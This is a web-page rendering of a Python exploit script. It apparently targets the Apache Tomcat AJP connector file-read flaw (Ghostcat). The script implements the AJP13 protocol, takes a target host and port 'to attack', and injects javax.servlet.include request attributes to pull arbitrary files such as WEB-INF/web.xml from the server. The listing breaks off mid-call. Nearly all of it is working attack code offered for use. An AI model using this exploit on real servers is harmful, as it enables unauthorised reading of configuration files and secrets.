class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_string</span>(<span class="params">s</span>):</span></span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;h&quot;</span>, <span class="number">-1</span>)</span><br><span class="line">        l = len(s)</span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;H%dsb&quot;</span> % l, l, s.encode(<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpack</span>(<span class="params">stream, fmt</span>):</span></span><br><span class="line">        size = struct.calcsize(fmt)</span><br><span class="line">        buf = stream.read(size)</span><br><span class="line">        <span class="keyword">return</span> struct.unpack(fmt, buf)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpack_string</span>(<span class="params">stream</span>):</span></span><br><span class="line">        size, = unpack(stream, <span class="string">&quot;&gt;h&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">-1</span>: <span class="comment"># null string</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        res, = unpack(stream, <span class="string">&quot;%ds&quot;</span> % size)</span><br><span class="line">        stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFoundException</span>(<span class="params">Exception</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AjpBodyRequest</span>(<span class="params">object</span>):</span></span><br><span class="line">        <span class="comment"># server == web server, container == servlet</span></span><br><span class="line">        SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(<span class="number">2</span>)</span><br><span class="line">        MAX_REQUEST_LENGTH = <span class="number">8186</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, data_stream, data_len, data_direction=None</span>):</span></span><br><span class="line">                self.data_stream = data_stream</span><br><span class="line">                self.data_len = data_len</span><br><span class="line">                self.data_direction = data_direction</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">serialize</span>(<span class="params">self</span>):</span></span><br><span class="line">                data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)</span><br><span class="line">                <span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x00</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        res = struct.pack(<span class="string">&quot;&gt;H&quot;</span>, len(data))</span><br><span class="line">                        res += data</span><br><span class="line">                <span class="keyword">if</span> self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:</span><br><span class="line">                        header = struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, len(res))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        header = struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, len(res))</span><br><span class="line">                <span class="keyword">return</span> header + res</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">send_and_receive</span>(<span class="params">self, socket, stream</span>):</span></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        data = self.serialize()</span><br><span class="line">                        socket.send(data)</span><br><span class="line">                        r = AjpResponse.receive(stream)</span><br><span class="line">                        <span class="keyword">while</span> r.prefix_code != AjpResponse.GET_BODY_CHUNK <span class="keyword">and</span> r.prefix_code != AjpResponse.SEND_HEADERS:</span><br><span class="line">                                r = AjpResponse.receive(stream)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> r.prefix_code == AjpResponse.SEND_HEADERS <span class="keyword">or</span> len(data) == <span class="number">4</span>:</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AjpForwardRequest</span>(<span class="params">object</span>):</span></span><br><span class="line">        _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(<span class="number">28</span>)</span><br><span class="line">        REQUEST_METHODS = &#123;<span class="string">&#x27;GET&#x27;</span>: GET, <span class="string">&#x27;POST&#x27;</span>: POST, <span class="string">&#x27;HEAD&#x27;</span>: HEAD, <span class="string">&#x27;OPTIONS&#x27;</span>: OPTIONS, <span class="string">&#x27;PUT&#x27;</span>: PUT, <span class="string">&#x27;DELETE&#x27;</span>: DELETE, <span class="string">&#x27;TRACE&#x27;</span>: TRACE&#125;</span><br><span class="line">        <span class="comment"># server == web server, container == servlet</span></span><br><span class="line">        SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(<span class="number">2</span>)</span><br><span class="line">        COMMON_HEADERS = [<span class="string">&quot;SC_REQ_ACCEPT&quot;</span>,</span><br><span class="line">                <span class="string">&quot;SC_REQ_ACCEPT_CHARSET&quot;</span>, <span class="string">&quot;SC_REQ_ACCEPT_ENCODING&quot;</span>, <span class="string">&quot;SC_REQ_ACCEPT_LANGUAGE&quot;</span>, <span class="string">&quot;SC_REQ_AUTHORIZATION&quot;</span>,</span><br><span class="line">                <span class="string">&quot;SC_REQ_CONNECTION&quot;</span>, <span class="string">&quot;SC_REQ_CONTENT_TYPE&quot;</span>, <span class="string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span>, <span class="string">&quot;SC_REQ_COOKIE&quot;</span>, <span class="string">&quot;SC_REQ_COOKIE2&quot;</span>,</span><br><span class="line">                <span class="string">&quot;SC_REQ_HOST&quot;</span>, <span class="string">&quot;SC_REQ_PRAGMA&quot;</span>, <span class="string">&quot;SC_REQ_REFERER&quot;</span>, <span class="string">&quot;SC_REQ_USER_AGENT&quot;</span></span><br><span class="line">        ]</span><br><span class="line">        ATTRIBUTES = [<span class="string">&quot;context&quot;</span>, <span class="string">&quot;servlet_path&quot;</span>, <span class="string">&quot;remote_user&quot;</span>, <span class="string">&quot;auth_type&quot;</span>, <span class="string">&quot;query_string&quot;</span>, <span class="string">&quot;route&quot;</span>, <span class="string">&quot;ssl_cert&quot;</span>, <span class="string">&quot;ssl_cipher&quot;</span>, <span class="string">&quot;ssl_session&quot;</span>, <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;ssl_key_size&quot;</span>, <span class="string">&quot;secret&quot;</span>, <span class="string">&quot;stored_method&quot;</span>]</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, data_direction=None</span>):</span></span><br><span class="line">                self.prefix_code = <span class="number">0x02</span></span><br><span class="line">                self.method = <span class="literal">None</span></span><br><span class="line">                self.protocol = <span class="literal">None</span></span><br><span class="line">                self.req_uri = <span class="literal">None</span></span><br><span class="line">                self.remote_addr = <span class="literal">None</span></span><br><span class="line">                self.remote_host = <span class="literal">None</span></span><br><span class="line">                self.server_name = <span class="literal">None</span></span><br><span class="line">                self.server_port = <span class="literal">None</span></span><br><span class="line">                self.is_ssl = <span class="literal">None</span></span><br><span class="line">                self.num_headers = <span class="literal">None</span></span><br><span class="line">                self.request_headers = <span class="literal">None</span></span><br><span class="line">                self.attributes = <span class="literal">None</span></span><br><span class="line">                self.data_direction = data_direction</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">pack_headers</span>(<span class="params">self</span>):</span></span><br><span class="line">                self.num_headers = len(self.request_headers)</span><br><span class="line">                res = <span class="string">&quot;&quot;</span></span><br><span class="line">                res = struct.pack(<span class="string">&quot;&gt;h&quot;</span>, self.num_headers)</span><br><span class="line">                <span class="keyword">for</span> h_name <span class="keyword">in</span> self.request_headers:</span><br><span class="line">                        <span class="keyword">if</span> h_name.startswith(<span class="string">&quot;SC_REQ&quot;</span>):</span><br><span class="line">                                code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + <span class="number">1</span></span><br><span class="line">                                res += struct.pack(<span class="string">&quot;BB&quot;</span>, <span class="number">0xA0</span>, code)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                                res += pack_string(h_name)</span><br><span class="line"></span><br><span class="line">                        res += pack_string(self.request_headers[h_name])</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">pack_attributes</span>(<span class="params">self</span>):</span></span><br><span class="line">                res = <span class="string">b&quot;&quot;</span></span><br><span class="line">                <span class="keyword">for</span> attr <span class="keyword">in</span> self.attributes:</span><br><span class="line">                        a_name = attr[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">                        code = AjpForwardRequest.ATTRIBUTES.index(a_name) + <span class="number">1</span></span><br><span class="line">                        res += struct.pack(<span class="string">&quot;b&quot;</span>, code)</span><br><span class="line">                        <span class="keyword">if</span> a_name == <span class="string">&quot;req_attribute&quot;</span>:</span><br><span class="line">                                aa_name, a_value = attr[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">                                res += pack_string(aa_name)</span><br><span class="line">                                res += pack_string(a_value)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                                res += pack_string(attr[<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">                res += struct.pack(<span class="string">&quot;B&quot;</span>, <span class="number">0xFF</span>)</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">serialize</span>(<span class="params">self</span>):</span></span><br><span class="line">                res = <span class="string">&quot;&quot;</span></span><br><span class="line">                res = struct.pack(<span class="string">&quot;bb&quot;</span>, self.prefix_code, self.method)</span><br><span class="line">                res += pack_string(self.protocol)</span><br><span class="line">                res += pack_string(self.req_uri)</span><br><span class="line">                res += pack_string(self.remote_addr)</span><br><span class="line">                res += pack_string(self.remote_host)</span><br><span class="line">                res += pack_string(self.server_name)</span><br><span class="line">                res += struct.pack(<span class="string">&quot;&gt;h&quot;</span>, self.server_port)</span><br><span class="line">                res += struct.pack(<span class="string">&quot;?&quot;</span>, self.is_ssl)</span><br><span class="line">                res += self.pack_headers()</span><br><span class="line">                res += self.pack_attributes()</span><br><span class="line">                <span class="keyword">if</span> self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:</span><br><span class="line">                        header = struct.pack(<span class="string">&quot;&gt;bbh&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, len(res))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        header = struct.pack(<span class="string">&quot;&gt;bbh&quot;</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, len(res))</span><br><span class="line">                <span class="keyword">return</span> header + res</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, raw_packet</span>):</span></span><br><span class="line">                stream = StringIO(raw_packet)</span><br><span class="line">                self.magic1, self.magic2, data_len = unpack(stream, <span class="string">&quot;bbH&quot;</span>)</span><br><span class="line">                self.prefix_code, self.method = unpack(stream, <span class="string">&quot;bb&quot;</span>)</span><br><span class="line">                self.protocol = unpack_string(stream)</span><br><span class="line">                self.req_uri = unpack_string(stream)</span><br><span class="line">                self.remote_addr = unpack_string(stream)</span><br><span class="line">                self.remote_host = unpack_string(stream)</span><br><span class="line">                self.server_name = unpack_string(stream)</span><br><span class="line">                self.server_port = unpack(stream, <span class="string">&quot;&gt;h&quot;</span>)</span><br><span class="line">                self.is_ssl = unpack(stream, <span class="string">&quot;?&quot;</span>)</span><br><span class="line">                self.num_headers, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">                self.request_headers = &#123;&#125;</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(self.num_headers):</span><br><span class="line">                        code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">                        <span class="keyword">if</span> code &gt; <span class="number">0xA000</span>:</span><br><span class="line">                                h_name = AjpForwardRequest.COMMON_HEADERS[code - <span class="number">0xA001</span>]</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                                h_name = unpack(stream, <span class="string">&quot;%ds&quot;</span> % code)</span><br><span class="line">                                stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">                        h_value = unpack_string(stream)</span><br><span class="line">                        self.request_headers[h_name] = h_value</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">send_and_receive</span>(<span class="params">self, socket, stream, save_cookies=False</span>):</span></span><br><span class="line">                res = []</span><br><span class="line">                i = socket.sendall(self.serialize())</span><br><span class="line">                <span class="keyword">if</span> self.method == AjpForwardRequest.POST:</span><br><span class="line">                        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">                r = AjpResponse.receive(stream)</span><br><span class="line">                <span class="keyword">assert</span> r.prefix_code == AjpResponse.SEND_HEADERS</span><br><span class="line">                res.append(r)</span><br><span class="line">                <span class="keyword">if</span> save_cookies <span class="keyword">and</span> <span class="string">&#x27;Set-Cookie&#x27;</span> <span class="keyword">in</span> r.response_headers:</span><br><span class="line">                        self.headers[<span class="string">&#x27;SC_REQ_COOKIE&#x27;</span>] = r.response_headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                <span class="comment"># read body chunks and end response packets</span></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        r = AjpResponse.receive(stream)</span><br><span class="line">                        res.append(r)</span><br><span class="line">                        <span class="keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">elif</span> r.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">                                <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                                <span class="keyword">raise</span> NotImplementedError</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AjpResponse</span>(<span class="params">object</span>):</span></span><br><span class="line">        _,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(<span class="number">7</span>)</span><br><span class="line">        COMMON_SEND_HEADERS = [</span><br><span class="line">                        <span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;Content-Language&quot;</span>, <span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;Date&quot;</span>, <span class="string">&quot;Last-Modified&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;Location&quot;</span>, <span class="string">&quot;Set-Cookie&quot;</span>, <span class="string">&quot;Set-Cookie2&quot;</span>, <span class="string">&quot;Servlet-Engine&quot;</span>, <span class="string">&quot;Status&quot;</span>, <span class="string">&quot;WWW-Authenticate&quot;</span></span><br><span class="line">                        ]</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">                <span class="comment"># read headers</span></span><br><span class="line">                self.magic, self.data_length, self.prefix_code = unpack(stream, <span class="string">&quot;&gt;HHb&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> self.prefix_code == AjpResponse.SEND_HEADERS:</span><br><span class="line">                        self.parse_send_headers(stream)</span><br><span class="line">                <span class="keyword">elif</span> self.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">                        self.parse_send_body_chunk(stream)</span><br><span class="line">                <span class="keyword">elif</span> self.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">                        self.parse_end_response(stream)</span><br><span class="line">                <span class="keyword">elif</span> self.prefix_code == AjpResponse.GET_BODY_CHUNK:</span><br><span class="line">                        self.parse_get_body_chunk(stream)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">parse_send_headers</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">                self.http_status_code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">                self.http_status_msg = unpack_string(stream)</span><br><span class="line">                self.num_headers, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">                self.response_headers = &#123;&#125;</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(self.num_headers):</span><br><span class="line">                        code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">                        <span class="keyword">if</span> code &lt;= <span class="number">0xA000</span>: <span class="comment"># custom header</span></span><br><span class="line">                                h_name, = unpack(stream, <span class="string">&quot;%ds&quot;</span> % code)</span><br><span class="line">                                stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">                                h_value = unpack_string(stream)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                                h_name = AjpResponse.COMMON_SEND_HEADERS[code<span class="number">-0xA001</span>]</span><br><span class="line">                                h_value = unpack_string(stream)</span><br><span class="line">                        self.response_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">parse_send_body_chunk</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">                self.data_length, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">                self.data = stream.read(self.data_length+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">parse_end_response</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">                self.reuse, = unpack(stream, <span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">parse_get_body_chunk</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">                rlen, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> rlen</span><br><span class="line"></span><br><span class="line"><span class="meta">        @staticmethod</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">receive</span>(<span class="params">stream</span>):</span></span><br><span class="line">                r = AjpResponse()</span><br><span class="line">                r.parse(stream)</span><br><span class="line">                <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prepare_ajp_forward_request</span>(<span class="params">target_host, req_uri, method=AjpForwardRequest.GET</span>):</span></span><br><span class="line">        fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><br><span class="line">        fr.method = method</span><br><span class="line">        fr.protocol = <span class="string">&quot;HTTP/1.1&quot;</span></span><br><span class="line">        fr.req_uri = req_uri</span><br><span class="line">        fr.remote_addr = target_host</span><br><span class="line">        fr.remote_host = <span class="literal">None</span></span><br><span class="line">        fr.server_name = target_host</span><br><span class="line">        fr.server_port = <span class="number">80</span></span><br><span class="line">        fr.request_headers = &#123;</span><br><span class="line">                <span class="string">&#x27;SC_REQ_ACCEPT&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;SC_REQ_CONNECTION&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;SC_REQ_CONTENT_LENGTH&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;SC_REQ_HOST&#x27;</span>: target_host,</span><br><span class="line">                <span class="string">&#x27;SC_REQ_USER_AGENT&#x27;</span>: <span class="string">&#x27;Mozilla&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, sdch&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        fr.is_ssl = <span class="literal">False</span></span><br><span class="line">        fr.attributes = []</span><br><span class="line">        <span class="keyword">return</span> fr</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tomcat</span>(<span class="params">object</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, target_host, target_port</span>):</span></span><br><span class="line">                self.target_host = target_host</span><br><span class="line">                self.target_port = target_port</span><br><span class="line"></span><br><span class="line">                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">                self.socket.connect((target_host, target_port))</span><br><span class="line">                self.stream = self.socket.makefile(<span class="string">&quot;rb&quot;</span>, bufsize=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">perform_request</span>(<span class="params">self, req_uri, headers=&#123;&#125;, method=<span class="string">&#x27;GET&#x27;</span>, user=None, password=None, attributes=[]</span>):</span></span><br><span class="line">                self.req_uri = req_uri</span><br><span class="line">                self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><br><span class="line">                print(<span class="string">&quot;Getting resource at ajp13://%s:%d%s&quot;</span> % (self.target_host, self.target_port, req_uri))</span><br><span class="line">                <span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> password <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        self.forward_request.request_headers[<span class="string">&#x27;SC_REQ_AUTHORIZATION&#x27;</span>] = <span class="string">&quot;Basic &quot;</span> + (<span class="string">&quot;%s:%s&quot;</span> % (user, password)).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="keyword">for</span> h <span class="keyword">in</span> headers:</span><br><span class="line">                        self.forward_request.request_headers[h] = headers[h]</span><br><span class="line">                <span class="keyword">for</span> a <span class="keyword">in</span> attributes:</span><br><span class="line">                        self.forward_request.attributes.append(a)</span><br><span class="line">                responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line">                <span class="keyword">if</span> len(responses) == <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">                snd_hdrs_res = responses[<span class="number">0</span>]</span><br><span class="line">                data_res = responses[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">                <span class="keyword">if</span> len(data_res) == <span class="number">0</span>:</span><br><span class="line">                        print(<span class="string">&quot;No data in response. Headers:%s\n&quot;</span> % snd_hdrs_res.response_headers)</span><br><span class="line">                <span class="keyword">return</span> snd_hdrs_res, data_res</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">javax.servlet.include.request_uri</span></span><br><span class="line"><span class="string">javax.servlet.include.path_info</span></span><br><span class="line"><span class="string">javax.servlet.include.servlet_path</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;target&quot;</span>, type=str, help=<span class="string">&quot;Hostname or IP to attack&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, type=int, default=<span class="number">8009</span>, help=<span class="string">&quot;AJP port to attack (default is 8009)&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&#x27;--file&#x27;</span>, type=str, default=<span class="string">&#x27;WEB-INF/web.xml&#x27;</span>, help=<span class="string">&quot;file path :(WEB-INF/web.xml)&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">t = Tomcat(args.target, args.port)</span><br><span class="line">_,data = t.perform_request(<span class="string">&#x27;/asdf.jsp&#x27;</span>,attributes=[</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.request_uri&#x27;</span>,<span class="string">&#x27;/&#x27;</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.path_info&#x27;</span>,args.file]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.servlet_path&#x27;</span>,<span class="string">&#x27;/&#x27;</span>]&#125;,</span><br><span 